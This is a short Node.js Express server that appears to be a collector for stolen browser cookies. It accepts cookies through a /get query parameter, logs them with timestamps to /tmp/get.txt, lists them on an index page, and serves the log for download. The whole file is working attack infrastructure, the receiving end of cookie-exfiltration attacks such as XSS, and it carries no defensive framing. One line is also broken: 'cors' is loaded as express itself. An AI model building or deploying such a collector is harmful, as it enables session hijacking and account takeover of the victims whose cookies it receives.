const express = require("express");
const cors = require("express");
const path = require("path");
const moment = require("moment");
const fs = require("fs/promises");

const app = express();
const publicPath = path.join(__dirname, "public");

app.use(cors());
app.use(express.static(publicPath));
app.set("view engine", "ejs");
app.set("server/views", path.join(__dirname, "views"));

app.get("/", async (req, res) => {
  let data;
  try {
    const pathName = "/tmp/get.txt";
    data = await fs.readFile(pathName, { encoding: "utf8" });
    data = data
      .split("\n")
      .filter((el) => el !== "")
      .map((el) => {
        const [time, cookie] = el.slice(1, el.length).split("]: ");
        return { time, cookie };
      });
  } catch (err) {}
  res.setHeader("Content-Type", "text/html");
  res.setHeader("Cache-Control", "s-max-age=60, stale-while-revalidate");
  res.render("index", {
    cookieList: data || [],
  });
});

app.get("/download", async (req, res) => {
  try {
    const pathName = "/tmp/get.txt";
    data = await fs.readFile(pathName, { encoding: "utf8" });
    res.download("/tmp/get.txt");
  } catch (error) {
    res.download(path.join(__dirname, "get.txt"));
  }
});

app.get("/get", async (req, res) => {
  const { cookie } = req.query;
  if (!cookie)
    return res.status(400).json({
      err: "Không có cookie.",
    });
  try {
    const pathName = "/tmp/get.txt";
    const content = `[${getTime()}]: ${cookie}\n`;
    await fs.writeFile(pathName, content, { flag: "a+" });
  } catch (err) {
    return res.status(500).json({
      msg: "Lỗi server.",
      err: err,
    });
  }
  res.json({
    msg: "Get cookie success.",
  });
});

app.listen(5000, async () => {
  console.log("Server is running on port 5000");
});

function getTime() {
  return `${moment().format("MMMM Do YYYY, h:mm:ss a")}`;
}
